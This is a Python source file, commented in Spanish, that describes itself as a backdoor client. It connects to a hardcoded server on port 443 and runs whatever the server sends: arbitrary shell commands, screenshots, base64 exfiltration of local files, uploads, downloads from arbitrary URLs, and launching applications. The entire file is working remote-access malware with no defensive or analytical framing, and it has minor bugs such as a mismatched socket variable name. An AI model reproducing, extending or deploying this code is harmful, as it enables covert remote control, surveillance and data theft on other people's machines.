'''
Resumen: Este script es un backdoor que se conecta a un servidor remoto y ejecuta comandos en el sistema.
El servidor puede enviar comandos al backdoor y recibir la salida de los comandos.
El backdoor también puede enviar capturas de pantalla al servidor.

El servidor debe ejecutar el script .py para recibir las conexiones del backdoor.'''


import socket
import subprocess
import sys
import signal
import struct
import os
import base64
import requests
import mss

current_dir = os.getcwd()

def signal_handler(sig, frame):
    print("\n[!] Exiting...")
    sys.exit(1)

signal.signal(signal.SIGINT, signal_handler)

def run_command(command):
    ''' 
    Ejecuta un comando en el sistema y devuelve la salida
    '''
    print(f"Running command: {command}")
    try:
        # Ejecutamos el comando y guardamos la salida
        output = subprocess.check_output(command, shell=True)
    except Exception as e:
        # Si hay un error, lo guardamos
        output = str(e)
        # Si hay un error, devolvemos un mensaje de error
        return b'[-] Error running command  \n'
    return output


def send_screenshot(client_socket):
    '''
    Enviar una captura de pantalla al servidor
    '''
    with open("c:\\temp\\capture.png", "rb") as file:
        screenshot_data = file.read()
    
    # Enviar primero el tamaño del archivo
    client_socket.send(struct.pack("!I", len(screenshot_data)))
    
    # Enviar los datos del archivo
    client_socket.sendall(screenshot_data)
    
    
def take_screenshot(client_socket):
    '''
    Función para tomar una captura de pantalla
    '''
    screen = mss.mss()
    screen.shot()

    with open("monitor-1.png", "rb") as file:
        screenshot_data = file.read()
        
    # Enviar primero el tamaño del archivo
    client_socket.send(struct.pack("!I", len(screenshot_data)))
    client_socket.sendall(screenshot_data)
    os.remove("monitor-1.png")  
    
    
def download_file(client_socket, file_path):
    '''
    Función para descargar un archivo y enviarlo al servidor
    '''
    try:
        with open(file_path, "rb") as file_download:
            client_socket.send(base64.b64encode(file_download.read()))
        print(f"File {file_path} sent successfully!")
    except Exception as e:
        print(f"Error downloading file: {e}")

def upload_file(client_socket, file_path):
    '''
    Función para recibir un archivo del servidor y guardarlo localmente
    '''
    try:
        with open(file_path, "wb") as file_upload:
            data = client_socket.recv(30000)
            file_upload.write(base64.b64decode(data))
        print(f"File {file_path} received successfully!")
    except Exception as e:
        print(f"Error uploading file: {e}")

def download_internet_file(url):
    '''
    Función para descargar un archivo de internet
    '''
    try:
        consulta = requests.get(url)
        name_file = url.split("/")[-1]
        with open(name_file, "wb") as file:
            file.write(consulta.content)
        print(f"File {name_file} downloaded successfully!")
    except Exception as e:
        print(f"Error downloading file: {e}")
        
def start_app(client_sockect,name_app):
    '''
    Función para iniciar una aplicación
    '''
    try:
        # Iniciar la aplicación en un proceso separado
        subprocess.Popen(name_app,shell=True)
        print(f"Application {name_app} started successfully!")
        client_socket.send(b"Application %s started successfully!" % name_app.encode())
    except Exception as e:
        print(f"Error starting application: {e}")

        
        

    

    
    

if __name__ == '__main__':
    
    
    # Creamos un socket para la conexión
    # con el servidor
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Nos conectamos al servidor
    client_socket.connect(('192.168.100.51', 443))
    
    client_socket.send(current_dir.encode())

    # Bucle infinito para recibir comandos
    while True:
        
        
        # Recibimos un mensaje del servidor
        command = client_socket.recv(2048).decode().strip()
        
        if command == "screenshot":
            send_screenshot(client_socket)
        
        # Comando download para descargar archivos
        elif command.startswith("download "):
            download_file(client_socket, command[9:])            

        
        # Comando upload para subir archivos
        elif command.startswith("upload "):
            upload_file(client_socket, command[7:])
        
        elif command.startswith("start "):
            start_app(client_socket,command[6:])
            
            
        # Comando download_internet para descargar archivos de internet
        elif command.startswith("geturl "):
            download_internet_file(command[7:])
        
        elif command.startswith("screenshot2"):
            take_screenshot(client_socket)

        
        elif command.startswith("cd "):
            # Cambiamos el directorio de trabajo
            # al directorio especificado
            try:
                os.chdir(command[3:])
                pwd = os.getcwd()
                # Enviamos el directorio actual al servidor
                client_socket.send(pwd.encode())
                
            except Exception as e:
                client_socket.send(b'\n[-] Error changing directory\n')
        else:
            # Pasamos el comando a la función run_command
            # que ejecutará el comando y devolverá la salida
            # usa decode() para convertir el mensaje a string.
            command_output = run_command(command).decode('cp850')
            
            # Enviamos la salida del comando al servidor, para
            # ver la salida en la consola del servidor.
            client_socket.send(b'\n' + command_output.encode() + b'\n')
        
    
            
    client_socket.close()